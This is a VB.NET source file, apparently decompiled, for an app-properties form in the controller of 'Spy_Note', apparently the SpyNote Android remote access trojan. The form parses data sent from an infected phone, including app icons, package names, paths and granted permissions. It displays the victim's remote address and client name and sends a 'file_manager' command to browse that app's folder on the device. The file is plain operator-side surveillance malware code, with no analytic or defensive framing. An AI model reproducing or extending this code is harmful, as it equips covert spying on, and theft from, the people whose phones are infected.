Imports System.IO
Imports System.Text.RegularExpressions
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Package_Info
    Public handle_Package_Info As Integer
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public Sub Package_Info_00(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim separator As String() = New String() {My.Forms.Form1.s.split_Ary}
                Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                Dim flag2 As Boolean = array.Length >= 10
                If flag2 Then
                    Dim buffer As Byte() = Convert.FromBase64String(array(0))
                    Dim memoryStream As MemoryStream = New MemoryStream(buffer)
                    Dim image As Bitmap = New Bitmap(image.FromStream(memoryStream))
                    Me.PictureBox1.Image = image
                    memoryStream.Dispose()
                    Me.TextBox1.Text = array(1)
                    Me.Label3.Text = array(2)
                    Me.TextBox2.Text = array(3)
                    Me.Label6.Text = array(4)
                    Me.TextBox3.Text = store_0.FormatFileSize(Conversions.ToLong(array(5)))
                    Me.TextBox4.Text = array(6)
                    Me.TextBox5.Text = array(7)
                    Me.TextBox6.Text = array(8)
                    Me.TextBox7.Text = array(9)
                End If
                Dim flag3 As Boolean = array.Length > 10
                If flag3 Then
                    Dim flag4 As Boolean = Operators.CompareString(array(10), Nothing, False) <> 0
                    If flag4 Then
                        Dim flag5 As Boolean = array(10).Contains(My.Forms.Form1.s.split_Line)
                        If flag5 Then
                            Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Line}
                            Dim array2 As String() = array(10).Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                            Dim num As Integer = array2.Length - 1
                            For i As Integer = 0 To num
                                Dim richTextBox As RichTextBox = Me.RichTextBox1
                                Dim richTextBox2 As RichTextBox = richTextBox
                                richTextBox.Text = richTextBox2.Text + array2(i) + vbCrLf
                            Next
                        Else
                            Me.RichTextBox1.Text = array(10)
                        End If
                    End If
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Package_Info_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.PictureBox3.Image = store_0.Bitmap_0("ctx_applications_manager")
        Me.PictureBox2.Image = store_0.Bitmap_0("ctx_file_manager")
        Me.RichTextBox1.ContextMenuStrip = store_0.ContextMenu1
        Me.TabPage1.Text = "App Info"
        Me.TabPage2.Text = "App permissions"
        MyBase.Icon = store_0.icons_0("window")
        Dim text As String = String.Format("Properties - Remote Address & Port: {0} Client Name: {1}", Me.Client_remote_Address, Me.Name_Client)
        Me.Text = text
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        Try
            Dim text As String = Me.TextBox4.Text
            Dim flag As Boolean = Operators.CompareString(text, Nothing, False) <> 0
            If flag Then
                Dim flag2 As Boolean = text.Contains("/")
                If flag2 Then
                    Dim text2 As String = "/"
                    Dim text3 As String = text
                    Dim pattern As String = text2
                    Dim flag3 As Boolean = Operators.CompareString(text3, Nothing, False) = 0
                    If Not flag3 Then
                        Dim flag4 As Boolean = Operators.CompareString(text3, text2, False) = 0
                        If Not flag4 Then
                            Dim regex As Regex = New Regex(pattern)
                            Dim matchCollection As MatchCollection = regex.Matches(text3)
                            Dim str As String = text3.Split(New Char() {Conversions.ToChar(text2)})(Conversions.ToInteger(matchCollection.Count.ToString()))
                            Dim str2 As String = text.Replace(text2 + str, Nothing)
                            My.Forms.Form1.s.Send(Me.handle_Number_Client, "file_manager" + My.Forms.Form1.s.SplitData + str2)
                        End If
                    End If
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        Try
            Dim text As String = Me.TextBox2.Text
            Dim flag As Boolean = Operators.CompareString(text, Nothing, False) <> 0
            If flag Then
                Dim fileName As String = "https://play.google.com/store/apps/details?id=" + text
                Process.Start(fileName)
            End If
        Catch ex As Exception
        End Try
    End Sub
End Class